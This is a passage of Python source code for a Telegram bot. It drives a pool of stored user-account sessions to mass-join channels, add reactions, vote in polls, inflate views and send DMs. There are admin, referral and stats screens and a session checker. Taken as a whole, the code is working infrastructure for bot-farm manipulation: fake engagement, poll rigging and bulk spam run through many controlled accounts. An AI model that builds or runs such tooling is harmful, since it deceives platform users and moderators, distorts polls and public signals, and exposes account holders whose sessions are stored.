    channel_target = message.text.strip()
    await state.update_data(channel_target=channel_target)
    await message.answer("<b>Step 3: Paste target message link URL (Example: https://t.me/channelname/123):</b>", parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave", "refer", "view", "speed"]:
        await prompt_for_account_scale(message, state)
    elif "react" in task_type and "vote" not in task_type:
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 4: Select target reaction emojis:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif "vote" in task_type:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔘 Native Poll Option Index", callback_data="set_vmode:poll", style="primary")],
            [InlineKeyboardButton(text="🎛️ Inline Callback Button Text", callback_data="set_vmode:inline", style="primary")]
        ])
        await message.answer("<b>Step 4: Specify structural mechanics type of voting:</b>", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
    elif task_type == "dm":
        await message.answer("<b>Step 4: Write exact context message to send:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_vote_mode_choice), F.data.startswith("set_vmode:"))
async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    vmode = callback.data.split(":")[1]
    await state.update_data(vote_mode=vmode)
    
    if vmode == "inline":
        await callback.message.edit_text("<b>Step 4b: Enter exact text label on target inline button:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    else:
        await callback.message.edit_text("<b>Step 4b: Enter option index number (0 for 1st, 1 for 2nd option):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_poll_option_index)

@router.message(StateFilter(TaskWizardStates.waiting_for_poll_option_index))
async def process_poll_option_index(message: Message, state: FSMContext):
    val = message.text.strip()
    if not val.isdigit():
        await message.answer("❌ Option pointer index value must be an integer.")
        return
    await state.update_data(poll_option_index=int(val))
    
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select target reaction emojis:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if emoji in selected:
        selected.remove(emoji)
    else:
        selected.append(emoji)
    await state.update_data(selected_emojis=selected)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if not selected:
        await callback.answer("⚠️ You must pick at least 1 active target reaction element.", show_alert=True)
        return
    await callback.answer()
    await state.update_data(reactions=selected)
    await prompt_for_account_scale(callback.message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(button_text=message.text.strip())
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select target reaction emojis:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(text=message.text.strip())
    await prompt_for_account_scale(message, state)

async def prompt_for_account_scale(message: Message, state: FSMContext):
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and account_routing == "all":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        elif role == "owner":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("""
                SELECT COUNT(*) FROM accounts 
                WHERE status = 'active' AND (
                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
                )
            """, (user_id, user_id))
        max_available = (await cursor.fetchone())[0]
        
    prompt_msg = (
        f"🔢 <b>Account Deployment Volume</b>\n\n"
        f"Available active sessions: <code>{max_available}</code>\n"
        f"Type number of accounts to deploy:\n"
        f"<i>(Type <code>0</code> to use ALL available active sessions)</i>"
    )
    
    if isinstance(message, Message):
        await message.answer(prompt_msg, parse_mode="HTML")
    else:
        await message.answer(prompt_msg, parse_mode="HTML")
        
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
    scale_text = message.text.strip()
    if not scale_text.isdigit():
        await message.answer("❌ <b>Syntax Error:</b> Numerical integer expected:")
        return
        
    requested_count = int(scale_text)
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and account_routing == "all":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        elif role == "owner":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("""
                SELECT COUNT(*) FROM accounts 
                WHERE status = 'active' AND (
                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
                )
            """, (user_id, user_id))
        max_available = (await cursor.fetchone())[0]

    if requested_count > max_available:
        await message.answer(f"❌ <b>Resource Boundary Exceeded:</b> Max available is <code>{max_available}</code>.", parse_mode="HTML")
        return

    await state.update_data(run_account_count=requested_count)
    await finalize_task_creation(message, state, bot)

async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    target = data.get("target", "")
    
    if data.get("leave_mode") != "all":
        _, link_msg_id, _ = parse_telegram_link(target)
        if link_msg_id:
            data["msg_id"] = link_msg_id

    init_msg = await bot.send_message(
        chat_id=user_id, 
        text="⏳ <b>Bootstrapping campaign threads...</b>",
        parse_mode="HTML"
    )

    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)", (user_id, task_type, json.dumps(data)))
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
    await state.clear()

# --- REFERRALS & ADMIN SYSTEM ---
@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]
    await callback.message.edit_text(f"👥 <b>Invitation Analytics</b>\n\nShare your referral link below:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal referred users: <code>{count}</code>.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu", style="primary")]]), parse_mode="HTML")

@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    await callback.message.edit_text(
        "🛡️ <b>Admin Panel</b>\n\n"
        "Available shell commands:\n\n"
        "🔹 <code>/grantaccess &lt;user_id&gt; [count]</code> - Grant task access for account IDs\n"
        "🔹 <code>/revokeaccess &lt;user_id&gt;</code> - Revoke granted account access\n"
        "🔹 <code>/addadmin &lt;id&gt;</code> - Promote user node into admin\n"
        "🔹 <code>/removeadmin &lt;id&gt;</code> - Deprecate admin access\n"
        "🔹 <code>/broadcast</code> - Broadcast content across global users\n"
        "🔹 <code>/canceltasks</code> - Kill all running tasks",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role != "super_owner":
        await callback.message.edit_text("🚫 Metrics dashboard view restricted to super owners.")
        return
        
    async with aiosqlite.connect(db_mgr.db_path) as db:
        total_users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        total_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
        active_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
        
        cursor = await db.execute("SELECT user_id, username, role FROM users WHERE role = 'admin' OR user_id IN (SELECT DISTINCT user_id FROM accounts)")
        user_rows = await cursor.fetchall()
        
        admin_metrics_text = "\n👥 <b>User Details & Accounts Partition Map:</b>\n"
        for u_id, u_name, u_role in user_rows:
            acc_count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (u_id,))
            acc_count = (await acc_count_res.fetchone())[0]
            admin_metrics_text += f"• Target: <code>{u_id}</code> (<b>@{u_name or 'None'}</b>) [<b>{u_role.upper()}</b>] ➜ Linked slots: <code>{acc_count}</code>\n"
            
    stats_text = (
        f"📈 <b>Live System Stats</b>\n\n"
        f"👥 Global active users: <code>{total_users}</code>\n"
        f"📱 Total linked session slots: <code>{total_accounts}</code>\n"
        f"🟢 Active connection online: <code>{active_accounts}</code>\n"
        f"----------------------------------------------------"
        f"{admin_metrics_text}"
    )
    
    await callback.message.edit_text(text=stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")

# --- BOOTSTRAPPING RUNTIME ---
async def verify_saved_sessions():
    logger.info("Verifying active account sessions...")
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()
    
    semaphore = asyncio.Semaphore(10)
    async def check_account(phone, enc_session):
        async with semaphore:
            try:
                client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
                await client.connect()
                if not await client.is_user_authorized():
                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                        await db_conn.commit()
                await client.disconnect()
            except:
                pass
                
    await asyncio.gather(*(check_account(p, s) for p, s in accounts))

async def main():
    global bot_username
    await db_mgr.init()
    await verify_saved_sessions()
    if not config.BOT_TOKEN:
        return
    bot = Bot(token=config.BOT_TOKEN)
    bot_info = await bot.get_me()
    bot_username = bot_info.username
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    worker_task = asyncio.create_task(task_queue.start_worker())
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot execution successfully stopped.")
